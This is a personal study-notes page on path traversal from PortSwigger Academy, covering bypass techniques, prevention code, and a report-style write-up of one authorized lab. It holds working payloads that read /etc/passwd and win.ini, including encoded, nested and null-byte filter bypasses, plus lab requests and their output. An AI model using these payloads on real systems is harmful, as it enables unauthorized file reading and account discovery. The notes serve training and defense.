---
title: "Path Traversal"
source: "https://github.com/Javierlozo/portswigger-academy-notes/blob/main/server-side/path-traversal.md"
topic: "https://portswigger.net/web-security/file-path-traversal"
order: 1
labsDone: 1
labsTotal: 1
---

## What is path traversal?

Also called directory traversal. The app reads a file from disk based on user-supplied input and doesn't sanitize the path. By inserting `../` sequences, an attacker steps out of the intended directory and reads (or sometimes writes) arbitrary files on the server. Common targets: app source code and data, back-end credentials, sensitive OS files like `/etc/passwd`.

In some cases the bug also lets an attacker write to arbitrary files. That's full server compromise: drop a webshell into the document root, overwrite a script, modify config.

## Reading arbitrary files via path traversal

A shopping site loads a product image like this:

```html
<img src="/loadImage?filename=218.png">
```

The server reads `/var/www/images/218.png` from disk and returns the bytes. If `filename` isn't sanitized, an attacker swaps the value:

```
/loadImage?filename=../../../etc/passwd
```

The resolved path becomes `/var/www/images/../../../etc/passwd`, which the filesystem normalizes to `/etc/passwd`. Three `../` sequences walk up from `/var/www/images/` to the root.

On Windows, both `../` and `..\` are valid traversal sequences:

```
/loadImage?filename=..\..\..\windows\win.ini
```

## Common obstacles and bypasses

Most apps have *some* defense. The defenses are usually shallow.

### Absolute path

If the app strips traversal sequences but doesn't enforce that paths stay inside the base directory, skip the traversal entirely:

```
/loadImage?filename=/etc/passwd
```

### Nested traversal sequences

If the app strips `../` non-recursively, embed the sequence inside itself so the inner removal leaves a working `../` behind:

```
....//
....\/
```

### URL encoding

If filters check for the literal string `../`, encode it:

```
%2e%2e%2f          (single-encoded ../)
%252e%252e%252f    (double-encoded; bypasses filters that decode once before checking)
..%c0%af           (non-standard encoding, sometimes accepted by older stacks)
```

### Required base directory

If the app enforces that input must start with the expected base directory, prepend it and traverse out:

```
/loadImage?filename=/var/www/images/../../../etc/passwd
```

### Required file extension

If the app enforces a trailing extension, use a null byte to truncate (works on legacy PHP and older Java):

```
/loadImage?filename=../../../etc/passwd%00.png
```

> **Burp tip:** Intruder ships a built-in "Fuzzing - path traversal" payload list. Mark the filename param, load that list, fire.

## Prevention

The most effective defense is to never pass user input to filesystem APIs in the first place.

When you must, layer two checks:

1. Validate the input against an allowlist of permitted values (or restrict to alphanumeric only).
2. After resolving the path, verify the canonical absolute path still starts with the expected base directory. Reject if not.

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
  // safe to read
}
```

## My notes

Mental model: user-controlled input → filesystem read → no sanitization. If a request has a path or filename in it, I try traversal.

Parameter names to grep for: `?file=`, `?image=`, `?doc=`, `?download=`, `?page=`, `?template=`, `?include=`. Image tags with paths are the obvious target, but file download endpoints, "view attachment" features, and template loaders all hit the same code path.

If the app appends an extension (`?file=X.png`), end the payload with the expected extension or use a null byte to truncate.

When the response is binary (an image), I use Burp's "Render" tab to confirm I'm getting back the file I asked for instead of squinting at hex.

## Labs

> The writeup below uses a full finding-report format. It documents a
> **PortSwigger Academy lab**, an authorized practice target, not a real
> engagement. I write one or two labs this way to show the report format;
> most labs stay in the compact notes style.

### Finding: File path traversal in product image loader

**Severity:** High (lab context) · **Category:** Path Traversal (OWASP A01: Broken Access Control) · **CWE-22**
**Level:** Apprentice · **Status:** Solved
**Affected endpoint:** `GET /image?filename=`
**Target:** [PortSwigger lab: File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple) (authorized practice environment)

#### Summary

The product image loader passes the client-supplied `filename` value straight to a filesystem read with no validation, so any user can read arbitrary files from the server, including `/etc/passwd`.

#### Steps to reproduce

1. Load a product page and intercept the image request in Burp Proxy. The app fetches images via a `filename` parameter:
   ```http
   GET /image?filename=44.jpg HTTP/2
   Host: TARGET.web-security-academy.net
   ```
2. Send the request to Repeater and replace the filename with a traversal payload back to the filesystem root:
   ```http
   GET /image?filename=../../../../../../../../../../etc/passwd HTTP/2
   Host: TARGET.web-security-academy.net
   ```
3. Send. The server returns `200 OK` with the contents of `/etc/passwd` in the response body:
   ```
   HTTP/2 200 OK
   Content-Type: image/jpeg
   Content-Length: 2316

   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ...
   peter:x:12001:12001::/home/peter:/bin/bash
   carlos:x:12002:12002::/home/carlos:/bin/bash
   ```

(Padding the payload with extra `../` is harmless: once the path resolves to the filesystem root, further `../` sequences are no-ops, so an over-long chain always reaches root without needing to count directory depth.)

#### Impact

Any unauthenticated user can read any file the application's OS user can access: application source and config, back-end credentials, and sensitive OS files. Reading `/etc/passwd` confirms arbitrary file read and also enumerates local accounts (`peter`, `carlos`), useful as a foothold for password attacks against other services.

#### Root cause

User input flows into a filesystem API with no sanitization. Conceptually:

```
read(BASE_DIRECTORY + request.filename)   // "/var/www/images/" + "../../../etc/passwd"
```

The concatenated path is never canonicalized or checked to confirm it stays inside the base directory, so `../` sequences walk out of it.

#### Remediation

- Prefer not passing user input to filesystem APIs at all. Map an opaque ID to a known file server-side instead of accepting a path.
- If a filename must be accepted, layer two checks:
  1. Validate against an allowlist (or restrict to alphanumeric).
  2. After resolving, confirm the canonical absolute path still starts with the base directory; reject otherwise.
  ```java
  File file = new File(BASE_DIRECTORY, userInput);
  if (!file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    throw new SecurityException("path traversal");
  }
  ```
- A Semgrep rule flagging user-controlled input reaching `new File(...)`, `open()`, `fs.readFile`, etc. without a canonicalization check catches this class in CI before it ships.

#### References

- PortSwigger topic: https://portswigger.net/web-security/file-path-traversal
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
